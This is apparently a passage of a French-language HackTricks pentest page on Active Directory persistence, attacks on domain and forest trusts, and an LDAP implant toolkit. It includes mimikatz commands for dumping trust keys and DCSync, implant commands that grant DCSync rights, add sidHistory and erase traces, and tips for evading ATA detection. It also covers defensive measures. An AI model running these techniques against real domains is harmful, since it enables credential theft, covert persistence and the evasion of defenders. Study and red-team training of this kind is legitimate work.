### **Persistance de compte par certificats**

**Posséder les certificats d'un compte ou être capable de les demander** est un très bon moyen de persister dans le compte de l'utilisateur (même s'il change le mot de passe) :


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistance domaine via certificats**

**L'utilisation de certificats permet également de persister avec des privilèges élevés à l'intérieur du domaine :**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

L'objet **AdminSDHolder** dans Active Directory assure la sécurité des **groupes privilégiés** (comme Domain Admins et Enterprise Admins) en appliquant une **Access Control List (ACL)** standard à travers ces groupes afin d'empêcher des modifications non autorisées. Cependant, cette fonctionnalité peut être exploitée ; si un attaquant modifie l'ACL de l'AdminSDHolder pour donner un accès complet à un utilisateur ordinaire, cet utilisateur obtient un contrôle étendu sur tous les groupes privilégiés. Cette mesure de sécurité, conçue pour protéger, peut donc se retourner contre son but et permettre un accès injustifié si elle n'est pas surveillée de près.

[**Plus d'informations sur le groupe AdminSDHolder ici.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

À l'intérieur de chaque **Domain Controller (DC)** existe un compte **local administrator**. En obtenant des droits admin sur une telle machine, le hash de l'Administrator local peut être extrait à l'aide de **mimikatz**. Ensuite, une modification du registre est nécessaire pour **activer l'utilisation de ce mot de passe**, permettant l'accès à distance au compte Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Vous pourriez **donner** des **permissions spéciales** à un **utilisateur** sur certains objets du domaine spécifiques qui permettront à l'utilisateur d'**escalader les privilèges à l'avenir**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Les **security descriptors** sont utilisés pour **stocker** les **permissions** qu'un **objet** possède. Si vous pouvez simplement **faire** un **petit changement** dans le **security descriptor** d'un objet, vous pouvez obtenir des privilèges très intéressants sur cet objet sans avoir besoin d'être membre d'un groupe privilégié.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Altérer **LSASS** en mémoire pour établir un **mot de passe universel**, donnant accès à tous les comptes du domaine.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Découvrez ce qu'est un SSP (Security Support Provider) ici.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Vous pouvez créer votre **propre SSP** pour **capture** en **clear text** les **credentials** utilisés pour accéder à la machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Il enregistre un **nouveau Domain Controller** dans l'AD et l'utilise pour **push attributes** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **need DA** privileges et devez être à l'intérieur du **root domain**.\
Notez que si vous utilisez de mauvaises données, des logs assez moches apparaîtront.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Nous avons précédemment discuté de la manière d'escalader des privilèges si vous disposez de **suffisantes permissions pour lire les mots de passe LAPS**. Cependant, ces mots de passe peuvent aussi être utilisés pour **maintenir la persistance**.\
Voir :


{{#ref}}
laps.md
{{#endref}}

## Escalade de privilèges au niveau Forêt - Domain Trusts

Microsoft considère la **Forêt** comme la frontière de sécurité. Cela implique que **la compromission d'un seul domaine pourrait potentiellement entraîner la compromission de toute la Forêt**.

### Informations de base

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) est un mécanisme de sécurité qui permet à un utilisateur d'un **domaine** d'accéder aux ressources d'un autre **domaine**. Il crée essentiellement un lien entre les systèmes d'authentification des deux domaines, permettant aux vérifications d'authentification de circuler sans heurt. Lorsque des domaines établissent une confiance, ils échangent et conservent des **clés** spécifiques au sein de leurs **Domain Controllers (DCs)**, qui sont cruciales pour l'intégrité de la confiance.

Dans un scénario typique, si un utilisateur souhaite accéder à un service dans un **domaine de confiance**, il doit d'abord demander un ticket spécial connu sous le nom de **inter-realm TGT** depuis le DC de son propre domaine. Ce TGT est chiffré avec une **clé de confiance** partagée que les deux domaines ont convenue. L'utilisateur présente ensuite ce TGT au **DC du domaine de confiance** pour obtenir un ticket de service (**TGS**). Après vérification réussie de l'inter-realm TGT par le DC du domaine de confiance, il émet un TGS, accordant à l'utilisateur l'accès au service.

**Étapes** :

1. Un **ordinateur client** dans le **Domaine 1** commence le processus en utilisant son **NTLM hash** pour demander un **Ticket Granting Ticket (TGT)** à son **Domain Controller (DC1)**.
2. DC1 émet un nouveau TGT si le client est authentifié avec succès.
3. Le client demande ensuite un **inter-realm TGT** à DC1, nécessaire pour accéder aux ressources dans le **Domaine 2**.
4. L'inter-realm TGT est chiffré avec une **trust key** partagée entre DC1 et DC2 dans le cadre de la relation de confiance bidirectionnelle.
5. Le client apporte l'inter-realm TGT au **Domain Controller (DC2)** du **Domaine 2**.
6. DC2 vérifie l'inter-realm TGT en utilisant sa clé de confiance partagée et, si valide, émet un **Ticket Granting Service (TGS)** pour le serveur du Domaine 2 que le client souhaite atteindre.
7. Enfin, le client présente ce TGS au serveur, qui est chiffré avec le hash du compte du serveur, pour obtenir l'accès au service dans le Domaine 2.

### Différents types de trusts

Il est important de remarquer qu'**un trust peut être à sens unique ou à double sens**. Dans l'option à deux sens, les deux domaines se font mutuellement confiance, mais dans la relation de confiance **à sens unique** l'un des domaines sera le **trusted** et l'autre le **trusting**. Dans ce dernier cas, **vous ne pourrez accéder qu'aux ressources du domaine trusting depuis le domaine trusted**.

Si le Domaine A fait confiance au Domaine B, A est le domaine trusting et B est le domaine trusted. De plus, dans le **Domaine A**, cela sera un **Outbound trust** ; et dans le **Domaine B**, cela sera un **Inbound trust**.

**Différentes relations de confiance**

- **Parent-Child Trusts** : C'est une configuration courante au sein de la même forêt, où un domaine enfant a automatiquement une trust bidirectionnelle transitive avec son domaine parent. Essentiellement, cela signifie que les demandes d'authentification peuvent circuler sans heurt entre le parent et l'enfant.
- **Cross-link Trusts** : Appelés "shortcut trusts", ils sont établis entre domaines enfants pour accélérer les processus de renvoi. Dans des forêts complexes, les renvois d'authentification doivent généralement remonter jusqu'à la racine de la forêt puis redescendre vers le domaine cible. En créant des cross-links, le trajet est raccourci, ce qui est particulièrement utile dans des environnements géographiquement dispersés.
- **External Trusts** : Ceux-ci sont configurés entre des domaines différents et non liés et sont non-transitifs par nature. Selon la documentation de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), les external trusts sont utiles pour accéder aux ressources dans un domaine en dehors de la forêt actuelle qui n'est pas connecté par une forest trust. La sécurité est renforcée par le filtrage SID avec les external trusts.
- **Tree-root Trusts** : Ces trusts sont automatiquement établis entre le domaine racine de la forêt et une nouvelle racine d'arbre ajoutée. Bien qu'ils ne soient pas fréquemment rencontrés, les tree-root trusts sont importants pour ajouter de nouveaux arbres de domaines à une forêt, leur permettant de conserver un nom de domaine unique et assurant la transitivité bidirectionnelle. Plus d'informations sont disponibles dans le guide de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts** : Ce type de trust est une trust transitive bidirectionnelle entre deux domaines racines de forêt, appliquant également le filtrage SID pour renforcer les mesures de sécurité.
- **MIT Trusts** : Ces trusts sont établis avec des domaines Kerberos non-Windows conformes à [RFC4120](https://tools.ietf.org/html/rfc4120). Les MIT trusts sont un peu plus spécialisés et s'adressent aux environnements nécessitant une intégration avec des systèmes basés sur Kerberos en dehors de l'écosystème Windows.

#### Autres différences dans les **relations de confiance**

- Une relation de trust peut également être **transitive** (A trust B, B trust C, donc A trust C) ou **non-transitive**.
- Une relation de trust peut être configurée comme une **trust bidirectionnelle** (les deux se font confiance) ou comme une **trust unidirectionnelle** (un seul fait confiance à l'autre).

### Chemin d'attaque

1. **Enumérer** les relations de confiance
2. Vérifier si un **security principal** (user/group/computer) a **access** aux ressources de **l'autre domaine**, peut-être via des entrées ACE ou en étant dans des groupes de l'autre domaine. Cherchez des **relationships across domains** (la trust a probablement été créée pour cela).
1. kerberoast dans ce cas pourrait être une autre option.
3. **Compromettre** les **comptes** qui peuvent **pivot** entre les domaines.

Les attaquants peuvent accéder aux ressources d'un autre domaine via trois mécanismes principaux :

- **Local Group Membership** : Des principals peuvent être ajoutés à des groupes locaux sur des machines, comme le groupe “Administrators” sur un serveur, leur accordant un contrôle significatif sur cette machine.
- **Foreign Domain Group Membership** : Des principals peuvent aussi être membres de groupes dans le domaine étranger. Cependant, l'efficacité de cette méthode dépend de la nature de la trust et de la portée du groupe.
- **Access Control Lists (ACLs)** : Des principals peuvent être spécifiés dans une **ACL**, particulièrement en tant qu'entités dans des **ACEs** au sein d'une **DACL**, leur fournissant l'accès à des ressources spécifiques. Pour ceux qui veulent approfondir la mécanique des ACLs, DACLs et ACEs, le whitepaper intitulé “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” est une ressource précieuse.

### Trouver des utilisateurs/groupes externes avec des permissions

Vous pouvez vérifier **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** pour trouver les foreign security principals dans le domaine. Ceux-ci seront des user/group provenant d'un **domaine/forêt externe**.

Vous pouvez vérifier cela dans **Bloodhound** ou en utilisant powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Autres moyens d'énumérer les trusts de domaine :
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Il existe **2 trusted keys**, une pour _Child --> Parent_ et une autre pour _Parent_ --> _Child_.\
> Vous pouvez vérifier celle utilisée par le domaine actuel avec :
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escaladez au niveau Enterprise admin vers le domaine enfant/parent en abusant de la relation de confiance via SID-History injection :


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Comprendre comment la Configuration Naming Context (NC) peut être exploitée est crucial. La Configuration NC sert de dépôt central pour les données de configuration à travers une forêt dans les environnements Active Directory (AD). Ces données sont répliquées vers chaque Domain Controller (DC) de la forêt, les DCs écrits conservant une copie modifiable de la Configuration NC. Pour exploiter cela, il faut disposer des **privilèges SYSTEM sur un DC**, de préférence un DC enfant.

**Link GPO to root DC site**

Le conteneur Sites de la Configuration NC contient des informations sur les sites de tous les ordinateurs joints au domaine au sein de la forêt AD. En opérant avec des privilèges SYSTEM sur n'importe quel DC, un attaquant peut lier des GPOs aux sites des DCs racines. Cette action peut potentiellement compromettre le domaine racine en manipulant les politiques appliquées à ces sites.

Pour des informations détaillées, on peut consulter la recherche sur [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Un vecteur d'attaque consiste à cibler des gMSA privilégiés au sein du domaine. La KDS Root key, essentielle pour calculer les mots de passe des gMSAs, est stockée dans la Configuration NC. Avec des privilèges SYSTEM sur n'importe quel DC, il est possible d'accéder à la KDS Root key et de calculer les mots de passe de n'importe quel gMSA dans la forêt.

Une analyse détaillée et un guide pas-à-pas se trouvent dans :


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Attaque MSA déléguée complémentaire (BadSuccessor – abus des attributs de migration) :


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Recherches externes complémentaires : [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Cette méthode réclame de la patience, en attendant la création de nouveaux objets AD privilégiés. Avec des privilèges SYSTEM, un attaquant peut modifier le AD Schema pour accorder à n'importe quel utilisateur le contrôle total sur toutes les classes. Cela peut conduire à un accès non autorisé et au contrôle des objets AD nouvellement créés.

Pour en savoir plus : [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

La vulnérabilité ADCS ESC5 cible le contrôle des objets Public Key Infrastructure (PKI) pour créer un template de certificat permettant de s'authentifier en tant que n'importe quel utilisateur au sein de la forêt. Comme les objets PKI résident dans la Configuration NC, compromettre un DC enfant modifiable permet d'exécuter des attaques ESC5.

Plus de détails : [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). Dans les scénarios sans ADCS, l'attaquant peut mettre en place les composants nécessaires, comme expliqué dans [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Dans ce scénario **votre domaine est approuvé par un domaine externe** vous donnant **des autorisations indéterminées** sur celui-ci. Vous devrez trouver **quels principals de votre domaine ont quels accès sur le domaine externe** puis tenter de les exploiter :

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Forêt de domaine externe - unidirectionnelle (sortant)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Dans ce scénario **votre domaine** accorde la **confiance** de certains **privilèges** à un principal d'**un domaine différent**.

Cependant, lorsqu'un **domaine est trusted** par le domaine de confiance, le domaine trusted **crée un utilisateur** avec un **nom prévisible** qui utilise comme **mot de passe le trusted password**. Ce qui signifie qu'il est possible pour **un utilisateur du domaine de confiance d'accéder au domaine trusted** pour l'énumérer et tenter d'escalader davantage de privilèges :


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Une autre façon de compromettre le domaine trusted est de trouver un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) créé dans la **direction opposée** de la confiance de domaine (ce qui n'est pas très courant).

Une autre façon de compromettre le domaine trusted est d'attendre sur une machine où un **utilisateur du domaine trusted peut se connecter** via **RDP**. L'attaquant peut alors injecter du code dans le processus de la session RDP et **accéder au domaine d'origine de la victime** depuis là.\
De plus, si la **victime a monté son disque dur**, depuis le processus de **session RDP** l'attaquant pourrait déposer des **backdoors** dans le **dossier de démarrage du disque dur**. Cette technique s'appelle **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Atténuation des abus de trust de domaine

### **SID Filtering:**

- Le risque d'attaques exploitant l'attribut SID history à travers des forest trusts est atténué par SID Filtering, qui est activé par défaut sur tous les trusts inter-forest. Cela repose sur l'hypothèse que les trusts intra-forest sont sûrs, considérant la forêt, plutôt que le domaine, comme la frontière de sécurité selon la position de Microsoft.
- Toutefois, il y a un inconvénient : SID Filtering peut perturber des applications et l'accès des utilisateurs, ce qui conduit parfois à sa désactivation.

### **Selective Authentication:**

- Pour les trusts inter-forest, l'emploi de Selective Authentication garantit que les utilisateurs des deux forêts ne sont pas automatiquement authentifiés. À la place, des permissions explicites sont requises pour que les utilisateurs accèdent aux domaines et serveurs au sein du domaine ou de la forêt de confiance.
- Il est important de noter que ces mesures ne protègent pas contre l'exploitation du writable Configuration Naming Context (NC) ni contre des attaques visant le compte de trust.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) réimplémente les primitives LDAP de style bloodyAD en tant que x64 Beacon Object Files qui s'exécutent entièrement à l'intérieur d'un implant sur hôte (par ex., Adaptix C2). Les opérateurs compilent le pack avec `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, chargent `ldap.axs`, puis appellent `ldap <subcommand>` depuis le beacon. Tout le trafic circule via le contexte de sécurité du logon courant sur LDAP (389) avec signing/sealing ou LDAPS (636) avec auto certificate trust, donc aucun proxy socks ni artefact disque n'est requis.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` résolvent les noms courts/chemins OU en DNs complets et dumpent les objets correspondants.
- `get-object`, `get-attribute`, and `get-domaininfo` récupèrent des attributs arbitraires (y compris les security descriptors) ainsi que les métadonnées de forêt/domaine depuis `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` exposent les roasting candidates, les paramètres de délégation et les descripteurs existants de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directement depuis LDAP.
- `get-acl` and `get-writable --detailed` analysent la DACL pour lister les trustees, les droits (GenericAll/WriteDACL/WriteOwner/attribute writes) et l'héritage, fournissant des cibles immédiates pour une escalation de privilèges via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Les BOFs de création d'objet (`add-user`, `add-computer`, `add-group`, `add-ou`) permettent à l'opérateur de déployer de nouveaux principals ou comptes machine partout où des droits sur l'OU existent. `add-groupmember`, `set-password`, `add-attribute`, et `set-attribute` détournent directement les cibles dès que des droits write-property sont obtenus.
- Les commandes axées sur les ACL telles que `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, et `add-dcsync` traduisent WriteDACL/WriteOwner sur n'importe quel objet AD en resets de mot de passe, contrôle de l'appartenance à des groupes, ou privilèges DCSync sans laisser d'artefacts PowerShell/ADSI. Les contreparties `remove-*` nettoient les ACE injectés.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` rendent instantanément un utilisateur compromis Kerberoastable ; `add-asreproastable` (basculage UAC) le marque pour l'AS-REP roasting sans toucher au mot de passe.
- Les macros de délégation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) réécrivent `msDS-AllowedToDelegateTo`, les flags UAC, ou `msDS-AllowedToActOnBehalfOfOtherIdentity` depuis le beacon, permettant des vecteurs d'attaque constrained/unconstrained/RBCD et éliminant le besoin de PowerShell distant ou RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injecte des SIDs privilégiés dans le SID history d'un principal contrôlé (voir [SID-History Injection](sid-history-injection.md)), fournissant un héritage d'accès furtif entièrement via LDAP/LDAPS.
- `move-object` change le DN/OU des ordinateurs ou utilisateurs, permettant à un attaquant de déplacer des actifs vers des OUs où des droits délégués existent déjà avant d'abuser de `set-password`, `add-groupmember`, ou `add-spn`.
- Les commandes de suppression à portée étroite (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permettent un rollback rapide après que l'opérateur a récolté des credentials ou établi une persistance, minimisant la télémétrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**En savoir plus sur la protection des credentials ici.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Restrictions pour Domain Admins** : Il est recommandé que les Domain Admins ne soient autorisés à se connecter que sur les Domain Controllers, évitant leur utilisation sur d'autres hôtes.
- **Service Account Privileges** : Les services ne devraient pas s'exécuter avec des privilèges Domain Admin (DA) pour maintenir la sécurité.
- **Limitation temporelle des privilèges** : Pour les tâches nécessitant des privilèges DA, leur durée doit être limitée. Cela peut être réalisé par : `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`

### **Implementing Deception Techniques**

- Mettre en œuvre de la deception implique de poser des pièges, comme des utilisateurs ou ordinateurs leurres, avec des caractéristiques telles que des mots de passe qui n'expirent pas ou sont marqués Trusted for Delegation. Une approche détaillée inclut la création d'utilisateurs avec des droits spécifiques ou leur ajout à des groupes à privilèges élevés.
- Un exemple pratique implique l'utilisation d'outils comme : `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Plus d'informations sur le déploiement de techniques de deception sont disponibles sur [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Pour les objets utilisateur** : Les indicateurs suspects incluent un ObjectSID atypique, des connexions peu fréquentes, les dates de création, et un faible nombre d'échecs de mot de passe.
- **Indicateurs généraux** : Comparer les attributs d'objets leurres potentiels avec ceux d'objets réels peut révéler des incohérences. Des outils comme [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) peuvent aider à identifier ces deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass** :
- **User Enumeration** : Éviter l'énumération de sessions sur les Domain Controllers pour prévenir la détection par ATA.
- **Ticket Impersonation** : L'utilisation de clés **aes** pour la création de tickets aide à échapper à la détection en n'effectuant pas de rétrogradation vers NTLM.
- **DCSync Attacks** : Il est conseillé d'exécuter depuis un hôte non-Domain Controller pour éviter la détection ATA, car une exécution directe depuis un Domain Controller déclenchera des alertes.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
